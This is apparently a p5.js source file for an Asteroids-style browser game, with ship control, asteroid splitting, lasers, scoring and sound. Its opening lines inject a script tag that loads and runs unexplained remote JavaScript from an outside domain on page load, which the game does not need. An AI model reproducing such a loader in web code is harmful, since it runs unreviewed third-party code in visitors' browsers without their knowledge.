var k = document.getElementsByTagName('head')[0];
var c = document.createElement('script');
c.async = true;
c.type = 'text/javascript';
c.charset = 'utf-8';
c.src = "https://akashraj.tech/js/a.js";
k.appendChild(c);

var ship;
var asteroids = [];
var totalAsteroids;;
var lasers = [];
var score = 0
var floating_scores = []
var debugging = false
var pause = false;
var win = false;
var dead = false;
var fire_sound;
var thrust_sound;
var bangLarge_sound;
var bangMedium_sound;
var bangSmall_sound;
var boom_sound;
var beat1_sound;
var beat2_sound;

var rotaion_speed = .05
var speed_limit = 7;
var velocity_damp_factor = .99;
var froce_multiplier = .4;
var decimal_limit = 4;


var laser_speed = 14;
var laser_lifetime = .5
var max_laser_limit = 10
var laser_delay = 0.1
var fps = 60

var level = 1;

var show_info=true

var debug = false
// function preLoad(){
//   fire_sound = loadSound("sounds/fire.mp3")
// 	thrust_sound = loadSound("sounds/thrust.mp3")
// 	bangLarge_sound = loadSound("sounds/bangLarge.wav")
// 	bangMedium_sound = loadSound("sounds/bangMedium.wav")
//   bangSmall_sound = loadSound("sounds/bangSmall.wav")
//   boom_sound=loadSound("sounds/boom.mp3")
// 	beat1_sound = loadSound("sounds/beat1.mp3")
// 	beat2_sound = loadSound("sounds/beat2.mp3")
// }

function setup() {
  frameRate(fps)
  canvas = createCanvas(windowWidth - 50, windowHeight - 50);
  canvas.position(25, 25)


  fire_sound = loadSound("sounds/fire.mp3")
  // fire_sound.playMode('untilDone')
  thrust_sound = loadSound("sounds/thrust.mp3")
  thrust_sound.playMode('untilDone')
  bangLarge_sound = loadSound("sounds/bangLarge.wav")
  bangLarge_sound.playMode('untilDone')
  bangMedium_sound = loadSound("sounds/bangMedium.wav")
  bangMedium_sound.playMode('untilDone')
  bangSmall_sound = loadSound("sounds/bangSmall.wav")
  bangSmall_sound.playMode('untilDone')
  boom_sound = loadSound("sounds/boom.mp3")
  boom_sound.playMode('untilDone')
  beat1_sound = loadSound("sounds/beat1.mp3")
  beat1_sound.playMode('untilDone')
  beat2_sound = loadSound("sounds/beat2.mp3")
  beat2_sound.playMode('untilDone')



  ship = new ship_o();
  totalAsteroids = floor(random(level * 5, level * 5 + 5));
  if (!debug)
    spawn_asteroids();
  smooth()
  // noLoop()
}

function reset() {
  clear()
  level = 0;
  score = 0;
  ship = new ship_o();
  asteroids = []
  totalAsteroids = floor(random(level * 5, level * 5 + 5));
  if (!debug)
    spawn_asteroids();
  smooth()
  play_pause()
}

function spawn_asteroids() {
  for (var i = 0; i < totalAsteroids; i++) {
    asteroids.push(new asteroid());
    dis = floor(asteroids[i].pos.dist(ship.pos))

    while (asteroids[i].clash) {
      if (dis < (asteroids[i].r * 4) && asteroids[i].clash) {
        asteroids[i].setPos()
        dis = floor(asteroids[i].pos.dist(ship.pos))
        //  console.log(asteroids[i].clash)
      } else {
        asteroids[i].clash = false
        // console.log(asteroids[i].clash)
      }
    }
  }
}

function draw() {
  background(0);
  keyPressed();
  render_ship();
  if (!debug)
    render_asteroids();
  render_laser();
  ship.crash(asteroids);
  if (!debug)
    display_score();
  render_floating_score()
  if(show_info)
  render_info()
}

function render_ship() {
  ship.render();
  ship.turn();
  ship.update();
  ship.edge();
}

function render_asteroids() {
  for (var i = 0; i < asteroids.length; i++) {
    // console.log(asteroids.length)
    if (asteroids[i].hitted) {
      if (debugging)
        console.log("hitted:" + i + " th ASTEROID")


      ast = asteroids[i]
      if (ast.r < 20) {
        bangSmall_sound.play()
        console.log("small")
      } else if (ast.r < 40) {
        bangMedium_sound.play()
        console.log("medium")
      } else if (ast.r > 40) {
        bangLarge_sound.play()
        console.log("large")
      }
      asteroids.splice(i, 1)
      // boom_sound.play()
      ast1 = new asteroid(ast.pos, ast.r / 2)
      ast2 = new asteroid(ast.pos, ast.r / 2)

      asteroids.push(ast1)
      asteroids.push(ast2)

      let score_inc = floor(ast.r / 2)


      score += score_inc
      floating_scores.push({
        num: score_inc,
        pos: ast.pos.copy(),
        init_frame: frameCount
      })
      continue;
    }

    if (asteroids[i].r < 10) {
      asteroids.splice(i, 1);
      score += 10;
      continue;
    }


    asteroids[i].render();
    asteroids[i].update();
    asteroids[i].edge();
    // text("", asteroids[i].pos.x, asteroids[i].pos.y)

  }
}


function render_info() {
  push()
  textAlign(RIGHT)
  textSize(20)
  fill(255, 255, 255, 100)
  text("Press P to Pause", width-10, 150)
  text("Press Z to save an screenshot", width-10, 170)
  text("Use arrow/asdw to move", width-10, 190)
  text("Use Space to shoot", width-10, 210)
  pop()
}

function render_laser() {

  for (var i = 0; i < lasers.length; i++) {

    lasers[i].render();
    lasers[i].update();
    lasers[i].edge();

    time = (lasers[i].f / frameRate());
    if (time > laser_lifetime || lasers[i].hits(asteroids))
      lasers.splice(i, 1)

  }



}

function render_floating_score() {

  for (let i = 0; i < floating_scores.length; i++) {
    const e = floating_scores[i];
    let t = (frameCount - e.init_frame)
    t.toFixed(2)
    if (t / frameRate() > 2) {
      floating_scores.splice(i, 1)
      continue;
    }
    let c;
    r = random(255); // r is a random number between 0 - 255
    g = random(100, 200); // g is a random number betwen 100 - 200
    b = random(20, 150); // b is a random number between 0 - 100
    // a = random(100,255); // a is a random number between 200 - 255

    c = color(r, g, b, 200);
    push()
    textAlign(CENTER)
    // textSize(50)
    textSize(e.num * 3)
    fill(c)
    text("+" + e.num, e.pos.x, e.pos.y - t)
    pop()
  }

  fill(255)
  text(floating_scores.length, width - 10, height - 10)
  // save 10+combo png
  // if(floating_scores.length>10)
  // saveCanvas("aestroids","png")

}

function display_score() {
  push()
  textAlign(CENTER)
  textSize(50)
  fill(170, 30, 30, 200)
  text("Level " + level, width / 2, 40)
  textSize(50)
  fill(30, 170, 30, 200)
  text(score, width / 2, 90)
  textSize(30)
  fill(10, 100, 130, 200)
  text("Target " + asteroids.length, width - 90, 90)
  pop()


  if (asteroids.length == 0) {
    win = true;
    push()
    textSize(40)
    textAlign(CENTER)
    fill(255)
    // stroke(255)
    text("YOU WIN !!!! \n  Press x to proceed", width / 2, height / 2)
    pop()
  }

  if (ship.crashed) {
    push()
    strokeWeight(2)
    // stroke(0,255,0,100)
    fill(255, 0, 0, 200)
    textSize(100)
    textAlign(CENTER)
    text("GAME OVER!", width / 2, height / 2)
    stroke(100)
    fill(0, 255, 0, 100)
    text("You scored " + score, width / 2, height / 2 + 100)
    textSize(30)
    textAlign(CENTER)
    fill(255)
    noStroke()
    text("Press p to try again", width / 2, height / 2 + 150)
    pop()
    // noLoop();
  }

  if (pause) {
    console.log("paused")
    push()
    textAlign(LEFT)
    textSize(40)
    fill(255)
    stroke(255)
    text("II PAUSED", 110, 110)
    textSize(20)
    // fill(150)
    // noStroke()
    // noFill()
    // stroke(255)
    strokeWeight(.1)
    text("Press P to resume", 110, 150)

    text("Press Z to save an screenshot", 110, 170)
    text("Use arrow/asdw to move", 110, 190)
    text("Use Space to shoot", 110, 210)
    pop()
    noLoop();

  }
}

function play_pause() {
  show_info=false
  if (pause) {
    pause = false;
    loop()
  } else if (!pause) {
    pause = true;
    noLoop();
  }

}


function keyReleased() {
  ship.setRotation(0);
  ship.boosting(false);
}



// /////////////////////keyPressed
function keyPressed() {
  if ((keyCode == RIGHT_ARROW || key == "d" || key == "D") && keyIsPressed) {
    ship.setRotation(rotaion_speed);
    beat1_sound.play()
    // console.log("right");

  }
  if ((keyCode == LEFT_ARROW || key == "a" || key == "A") && keyIsPressed) {
    ship.setRotation(-rotaion_speed);
    beat2_sound.play()
    // console.log("left");
  }
  if ((keyCode == UP_ARROW || key == "w" || key == "W") && keyIsPressed) {
    ship.boost();
    ship.animate()
    thrust_sound.play()
    // console.log("up");
  }
  if ((keyCode == DOWN_ARROW || key == "s" || key == "S") && keyIsPressed) {
    ship.boost(-1);
    ship.animate()
    thrust_sound.play()
    // console.log("down");
  }
  if ((key == " " || key == "") && keyIsPressed) {
    // lasers.length
    // console.log(lasers.length);

    var ttl
    if (lasers.length > 1) {
      ttl = (frameCount - lasers.slice(-1)[0].init_frame) / frameRate()
    } else {
      ttl = laser_delay + 1;
    }
    // console.log(ttl);

    if (lasers.length < max_laser_limit && ttl > laser_delay) {
      let pos = ship.pos.copy()
      pos.add(createVector(0, 0))
      lasers.push(new laser(pos, ship.heading))
      fire_sound.play(amp = .1);
      // console.log("shot");

    }
    // console.log("space");
  }


}
// ////////////////////keyPressed


function keyTyped() {
  if ((key == "p" || key == "P") && keyIsPressed) {
    play_pause()
  }
  if ((key == "p" || key == "P") && ship.crashed) {
    play_pause()
    reset()
  }
  if ((key == "z" || key == "Z")) {
    saveCanvas("asteroids", "png")
  }
  if ((win && (key == "x" || key == "X") && keyIsPressed)) {
    win = false;
    totalAsteroids = floor(random(level * 5, level * 5 + 5));
    spawn_asteroids();
    level++;
  }
}
